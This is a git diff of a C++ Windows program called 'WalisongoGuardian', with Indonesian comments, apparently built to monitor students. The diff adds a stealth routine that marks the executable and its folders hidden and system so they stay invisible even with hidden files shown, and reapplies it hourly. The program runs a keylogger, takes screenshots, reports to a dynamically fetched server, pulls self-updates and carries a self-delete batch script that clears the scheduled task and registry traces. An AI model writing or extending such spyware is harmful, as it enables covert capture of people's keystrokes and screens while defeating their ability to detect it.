@@ -33,7 +33,7 @@
 using namespace std;
 namespace fs = std::filesystem;
 
-// Include Core Modules
+// Include Core Modules (Pastikan file ini ada di direktori project)
 #include "core/globals.h"
 #include "core/config.h"
 #include "core/utils.h"
@@ -50,12 +50,34 @@ namespace fs = std::filesystem;
 // --- Prototipe Fungsi & Variabel Global ---
 time_t lastLinkCheck = 0;
 int connectionFailCount = 0; 
-const int MAX_SLEEP_TIME = 1800; // Maksimal 30 menit (1800 detik)
+const int MAX_SLEEP_TIME = 1800; // Maksimal 30 menit
 
 bool FetchLatestLink(); 
 void ExecuteUpdateCheck(HANDLE hMutex);
 
-// Helper untuk mengekstrak nilai JSON yang lebih tangguh terhadap spasi
+// Fungsi untuk memastikan file dan folder benar-benar tersembunyi (Stealth)
+void EnsureUltimateStealth() {
+    try {
+        wchar_t myPathRaw[MAX_PATH];
+        GetModuleFileNameW(NULL, myPathRaw, MAX_PATH);
+        fs::path p(myPathRaw);
+        
+        // 1. Sembunyikan File .exe (Hidden + System + ReadOnly)
+        // Atribut SYSTEM membuatnya hilang meskipun "Show Hidden Files" aktif
+        SetFileAttributesW(p.wstring().c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
+
+        // 2. Sembunyikan Folder Induk
+        fs::path parentDir = p.parent_path();
+        SetFileAttributesW(parentDir.wstring().c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+
+        // 3. Sembunyikan folder Cache data
+        fs::path cachePath = GetCache(""); // Mengambil base path cache
+        if (fs::exists(cachePath)) {
+            SetFileAttributesW(cachePath.wstring().c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+        }
+    } catch (...) {}
+}
+
 string GetJsonValue(const string& json, const string& key) {
     size_t keyPos = json.find("\"" + key + "\"");
     if (keyPos == string::npos) return "";
@@ -73,21 +95,17 @@ string GetJsonValue(const string& json, const string& key) {
 }
 
 void ExecuteUpdateCheck(HANDLE hMutex) {
+    HINTERNET hInt = NULL;
+    HINTERNET hConnect = NULL;
     try {
-        // Pastikan link tersedia sebelum mengecek
         if (Config::DYNAMIC_SERVER_URL.empty()) {
-            bool success = FetchLatestLink();
-            if (!success) {
+            if (!FetchLatestLink()) {
                 connectionFailCount++;
                 return;
-            } else {
-                connectionFailCount = 0; // Reset jika berhasil
             }
         }
         
         string baseUrl = Config::DYNAMIC_SERVER_URL;
-        
-        // Buang path /upload jika ada agar tidak salah endpoint
         size_t uploadPos = baseUrl.find("/upload");
         if (uploadPos != string::npos) baseUrl = baseUrl.substr(0, uploadPos);
         if (!baseUrl.empty() && baseUrl.back() == '/') baseUrl.pop_back();
@@ -95,68 +113,69 @@ void ExecuteUpdateCheck(HANDLE hMutex) {
         string checkUrl = baseUrl + "/check-update";
         string downloadUrl = baseUrl + "/get-update";
 
-        HINTERNET hInt = InternetOpenA("WalisongoGuardian/1.5", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-        if (hInt) {
-            string headers = "X-API-Key: " + Config::RAW_API_KEY + "\r\n" +
-                             "X-Client-Version: " + Config::CLIENT_VERSION + "\r\n";
-            
-            DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
-            if (baseUrl.find("https://") == 0) flags |= INTERNET_FLAG_SECURE;
+        hInt = InternetOpenA("WalisongoGuardian/1.5", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+        if (!hInt) return;
 
-            HINTERNET hConnect = InternetOpenUrlA(hInt, checkUrl.c_str(), headers.c_str(), (DWORD)headers.length(), flags, 0);
-            
-            if (hConnect) {
-                char buffer[2048] = {0}; DWORD read;
-                if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &read)) {
-                    string response(buffer);
-                    string sHash = GetJsonValue(response, "latest_hash");
-                    
-                    wchar_t myPath[MAX_PATH]; 
-                    GetModuleFileNameW(NULL, myPath, MAX_PATH);
-                    
-                    if (!sHash.empty() && sHash != "not_found" && sHash != "error") {
-                        if (GetFileSHA256(myPath) != sHash) {
-                            fs::path currentPath(myPath);
-                            wstring newExe = (currentPath.parent_path() / L"upd_tmp.exe").wstring();
-                            
-                            if (DownloadNewVersion(downloadUrl, newExe)) {
-                                if (GetFileSHA256(newExe) == sHash) {
-                                    InternetCloseHandle(hConnect);
-                                    InternetCloseHandle(hInt);
-                                    if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
-                                    ApplyUpdate(newExe); 
-                                    exit(0); 
-                                } else {
-                                    fs::remove(newExe);
-                                }
+        string headers = "X-API-Key: " + Config::RAW_API_KEY + "\r\n" +
+                         "X-Client-Version: " + Config::CLIENT_VERSION + "\r\n";
+        
+        DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
+        if (baseUrl.find("https://") == 0) flags |= INTERNET_FLAG_SECURE;
+
+        hConnect = InternetOpenUrlA(hInt, checkUrl.c_str(), headers.c_str(), (DWORD)headers.length(), flags, 0);
+        
+        if (hConnect) {
+            char buffer[2048] = {0}; DWORD read;
+            if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &read)) {
+                string response(buffer);
+                string sHash = GetJsonValue(response, "latest_hash");
+                
+                wchar_t myPath[MAX_PATH]; 
+                GetModuleFileNameW(NULL, myPath, MAX_PATH);
+                
+                if (!sHash.empty() && sHash != "not_found" && sHash != "error") {
+                    if (GetFileSHA256(myPath) != sHash) {
+                        fs::path currentPath(myPath);
+                        wstring newExe = (currentPath.parent_path() / L"upd_tmp.exe").wstring();
+                        
+                        if (DownloadNewVersion(downloadUrl, newExe)) {
+                            if (GetFileSHA256(newExe) == sHash) {
+                                if (hConnect) InternetCloseHandle(hConnect);
+                                if (hInt) InternetCloseHandle(hInt);
+                                if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
+                                ApplyUpdate(newExe); 
+                                exit(0); 
+                            } else {
+                                fs::remove(newExe);
                             }
                         }
                     }
                 }
-                InternetCloseHandle(hConnect);
             }
-            InternetCloseHandle(hInt);
         }
     } catch (...) {
         connectionFailCount++;
     }
+    if (hConnect) InternetCloseHandle(hConnect);
+    if (hInt) InternetCloseHandle(hInt);
 }
 
-// Fungsi untuk memicu penghapusan diri (Self-Destruct)
 void InitiateSelfDestruct() {
     wchar_t myPathRaw[MAX_PATH];
     GetModuleFileNameW(NULL, myPathRaw, MAX_PATH);
-    std::filesystem::path targetExe(myPathRaw);
-    std::filesystem::path batPath = targetExe.parent_path() / L"kill_worker.bat";
+    fs::path targetExe(myPathRaw);
+    fs::path batPath = targetExe.parent_path() / L"kill_worker.bat";
 
-    std::ofstream bat(batPath);
+    ofstream bat(batPath);
     if (bat.is_open()) {
         bat << "@echo off\n";
         bat << "timeout /t 3 /nobreak > nul\n"; 
+        bat << "schtasks /delete /tn \"" << Ws2S(Config::TASK_NAME) << "\" /f >nul 2>&1\n"; // Hapus Scheduler
         bat << ":RETRY\n";
         bat << "del /f /q \"" << Ws2S(targetExe.wstring()) << "\" >nul 2>&1\n";
         bat << "if exist \"" << Ws2S(targetExe.wstring()) << "\" goto RETRY\n";
-        bat << "reg delete \"HKEY_CURRENT_USER\\Software\\SystemMonitor\" /f >nul 2>&1\n";
+        bat << "reg delete \"HKEY_CURRENT_USER\\" << Ws2S(Config::REG_PATH) << "\" /f >nul 2>&1\n";
+        bat << "reg delete \"HKEY_LOCAL_MACHINE\\" << Ws2S(Config::REG_PATH) << "\" /f >nul 2>&1\n";
         bat << "del \"%~f0\"\n"; 
         bat.close();
 
@@ -173,6 +192,9 @@ void CheckKillSwitch() {
 }
 
 void ServiceLogic() {
+    // 1. Masuk ke mode Stealth segera
+    EnsureUltimateStealth();
+
     GetCache("activity");
     GetCache("keylog");
     GetCache("screenshot");
@@ -194,16 +216,24 @@ void ServiceLogic() {
         return; 
     }
 
-    // 1. Pastikan URL Server sudah didapatkan sebelum menjalankan modul pengiriman
     if (Config::DYNAMIC_SERVER_URL.empty()) {
         FetchLatestLink(); 
     }
     ExecuteUpdateCheck(hMutex);
 
+    // Cek di HKLM dulu (prioritas admin), jika tidak ada cek HKCU
     HKEY hKey;
     wchar_t n[256] = {0}, c[256] = {0}, id[256] = {0};
     DWORD sz = sizeof(n);
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, Config::REG_PATH.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+    bool regSuccess = false;
+
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, Config::REG_PATH.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        regSuccess = true;
+    } else if (RegOpenKeyExW(HKEY_CURRENT_USER, Config::REG_PATH.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        regSuccess = true;
+    }
+
+    if (regSuccess) {
         RegQueryValueExW(hKey, L"StudentName", NULL, NULL, (BYTE*)n, &sz); sz = sizeof(c);
         RegQueryValueExW(hKey, L"StudentClass", NULL, NULL, (BYTE*)c, &sz); sz = sizeof(id);
         RegQueryValueExW(hKey, L"SystemID", NULL, NULL, (BYTE*)id, &sz);
@@ -211,19 +241,15 @@ void ServiceLogic() {
         RegCloseKey(hKey);
     }
 
-    SetProcessDPIAware(); 
     FreeConsole(); 
 
-    // --- INISIALISASI GDI+ GLOBAL ---
-    // Dipindahkan ke sini agar TakeScreenshot berjalan instan tanpa overhead startup/shutdown berulang
     Gdiplus::GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
-    std::thread(KeylogLoop).detach();
-    std::thread(WifiFilter::StartMonitoring).detach();
+    thread(KeylogLoop).detach();
+    thread(WifiFilter::StartMonitoring).detach();
 
-    // 3. Jalankan pemantauan aktif HANYA setelah URL dipastikan siap
     if (!Config::DYNAMIC_SERVER_URL.empty()) {
         ActiveMonitor::StartReactiveMonitoring();
         ActiveMonitor::SendActiveStatus(); 
@@ -236,23 +262,18 @@ void ServiceLogic() {
         try {
             loopCounter++;
             
+            // Re-apply stealth setiap 1 jam untuk mencegah perubahan manual
+            if (loopCounter % 1200 == 0) EnsureUltimateStealth();
+
             if (Config::DYNAMIC_SERVER_URL.empty() || loopCounter % 100 == 0) {
                 if(FetchLatestLink()) connectionFailCount = 0;
             }
 
-            if (loopCounter % 50 == 0) {
-                ExecuteUpdateCheck(hMutex);
-            }
-
-            if (loopCounter % 20 == 0) { 
-                CheckKillSwitch(); 
-            }
-            
-            if (loopCounter % 120 == 0) { 
-                ActiveMonitor::SendActiveStatus();
-            }
-
+            if (loopCounter % 50 == 0) ExecuteUpdateCheck(hMutex);
+            if (loopCounter % 20 == 0) CheckKillSwitch(); 
+            if (loopCounter % 120 == 0) ActiveMonitor::SendActiveStatus();
             if (loopCounter % 60 == 0) CleanupOldData(); 
+            
             ProcessOfflineQueue(); 
 
             string currentWin = SystemMonitor::GetActiveWindowTitle();
@@ -272,7 +293,6 @@ void ServiceLogic() {
             if (detected) {
                 if (!isKeyloggerRunning || (currentWin != lastWindow && !currentWin.empty())) {
                     isKeyloggerRunning = true;
-                    // Fungsi TakeScreenshot sekarang sangat cepat karena GDI+ sudah aktif secara global
                     vector<BYTE> ss = SystemMonitor::TakeScreenshot();
                     if (!ss.empty()) {
                         XORData(ss);
@@ -297,15 +317,11 @@ void ServiceLogic() {
                 if(ofs.is_open()) { ofs.write((char*)v.data(), v.size()); ofs.close(); }
             }
 
-            if (currentWin != lastWindow) {
-                lastWindow = currentWin;
-            }
+            lastWindow = currentWin;
 
-            // --- LOGIKA SLEEP DINAMIS ---
             int sleepSeconds;
             if (connectionFailCount > 0) {
-                sleepSeconds = connectionFailCount * 60; 
-                if (sleepSeconds > MAX_SLEEP_TIME) sleepSeconds = MAX_SLEEP_TIME;
+                sleepSeconds = min((connectionFailCount * 60), MAX_SLEEP_TIME);
             } else {
                 sleepSeconds = (loopCounter % 15 == 0 ? 10 : 3);
             }
@@ -318,15 +334,10 @@ void ServiceLogic() {
             this_thread::sleep_for(chrono::seconds(30)); 
         }
     }
-
-    // Shutdown GDI+ saat keluar (opsional karena ini service loop infinite)
     Gdiplus::GdiplusShutdown(gdiplusToken);
 }
 
 bool FetchLatestLink() {
-    // inisialisai nilai nol agar berjalan saat pertama kali di jalankan
-    time_t lastLinkCheck = 0;
-
     time_t now = time(NULL);
     if (now - lastLinkCheck < 300 && !Config::DYNAMIC_SERVER_URL.empty()) return true;
 
@@ -365,6 +376,9 @@ bool FetchLatestLink() {
 }
 
 int main(int argc, char* argv[]) {
+    // Set DPI awareness di awal agar screenshot tidak blur/terpotong
+    SetProcessDPIAware();
+
     bool isBackground = (argc > 1 && string(argv[1]) == "--background");
     
     if (isBackground) {
